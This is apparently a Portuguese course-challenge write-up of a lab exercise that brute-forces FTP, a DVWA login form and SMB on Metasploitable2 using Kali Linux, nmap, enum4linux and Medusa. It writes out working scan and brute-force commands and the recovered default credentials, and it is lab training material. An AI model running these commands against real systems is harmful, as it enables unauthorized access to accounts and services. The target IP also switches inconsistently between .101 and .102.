# Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux.

## Visão geral
Desafio do curso de Cibersegurança 2025 da Santander com parceria DIO, com o intuito de práticar e simular ataques de força bruta e criação de wordlists em um ambiente controlado, utilizando os sistemas Kali Linux e a ferramenta Medusa para acessar o Metasploitable2 e DVWA.

---

## Verificação de ip
No Metasploitable2 que será utilizado como a máquina alvo iremos verificar o ip com o comando.
```bash
ip a
```

<img width="644" height="239" alt="image" src="https://github.com/user-attachments/assets/3b6471e9-e284-4381-8b16-6ff12a7dab3c" />

Obtivemos o ip “192.168.56.101” da máquina alvo.

Agora que conseguimos o ip da máquina alvo, será feito o teste de conectividade para verificar se as máquinas estão na mesma rede com o comando.

```bash
ping -c 3 192.168.56.101
````

<img width="613" height="196" alt="image" src="https://github.com/user-attachments/assets/1b8b87c6-680a-4cd2-9c37-1d971ce055c2" />

---

## Verificação de portas abertas

Com as máquinas conectadas na mesma rede, iremos fazer a verificação de portas abertas da máquina alvo com o comando.

```bash
nmap -sV -p 21,22,80,445,139 192.168.56.102
```

<img width="886" height="312" alt="image" src="https://github.com/user-attachments/assets/16846d38-2532-4d44-9f17-34b6a54dabe7" />

A porta que iremos atacar será a 21/tcp do serviço ftp.

---

## Criando listas de usuários e senhas + ataque com a Medusa

Com os seguintes comandos iremos criar os usuários e senhas para realizar o ataque com a Medusa.

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

Lista de usuários e senhas criadas, agora será feito o ataque na máquina alvo com o seguinte comando.

```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
```

<img width="886" height="378" alt="image" src="https://github.com/user-attachments/assets/eb510397-cee6-46e3-bc15-321fc51bae8b" />

Senha e usuário capturadas com sucesso.

```bash
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```
---

## Realizando o ataque

Com os dados da senha e usuário capturados é a hora de realizar o ataque na máquina alvo através do serviço ftp com o comando.

```bash
ftp 192.168.56.101
```

<img width="495" height="292" alt="image" src="https://github.com/user-attachments/assets/c5c0a67b-84d7-4ac2-83fd-e282de270355" />

Máquina alvo acessada com sucesso.

---
## Ataque em formulário DVWA

Criação de wordlist com os comandos.
```bash
echo -e "user\nadmin\nmsfadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
echo -e "user\nadmin\nmsfadmin\nroot" > users.txt
```
Utilizando a Medusa para gerar tentativas de senhas e usuários para login com o comando.
```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
  -m PAGE:/dvwa/login.php \
  -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
  -m FAIL:"Login failed" \
  -t 7
```

<img width="820" height="130" alt="image" src="https://github.com/user-attachments/assets/2055aab1-1a62-469d-bd52-35350d12b263" />

<img width="886" height="570" alt="image" src="https://github.com/user-attachments/assets/bc3cc17c-32cf-4e79-80e9-55fff6bb8136" />

Senha e usuário capturadas com sucesso.

---

## Ataque de enumeração SMB

Inicia a enumeração de usuário com o comando.
```bash
enum4linux -a 192.168.56.101 | tee enum4_output.txt
```
<img width="728" height="78" alt="image" src="https://github.com/user-attachments/assets/2ab3dbf2-29fb-419d-a7e0-f767bd2bbe91" />

O comando executa e começa enumeração de usuários, que retorna com os resultados, prosseguimos o ataque com o proximo comando e a criação de wordlist.

<img width="599" height="159" alt="image" src="https://github.com/user-attachments/assets/fbe67e1a-88d3-4478-b4e6-3010668129cd" />

```bash
echo -e "user\nmsfadmin\nservice" > smb_users.txt
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
```

Agora inicia o ateque com a Medusa com o comando.

```bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

<img width="750" height="488" alt="image" src="https://github.com/user-attachments/assets/5712337b-d1a5-4660-ac16-aaddb5b0703a" />

Senha e usuário capturadas com sucesso.

```bash
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin
```
Utilizamos a senha e usuário obtidos para o acesso e o seguinte comando.

```bash
smbclient -L //192.168.56.102 -U msfadmin
```

<img width="752" height="332" alt="image" src="https://github.com/user-attachments/assets/f29c1d0e-d29b-415c-8703-87bcdbfd1936" />

Acesso realizado com sucesso.
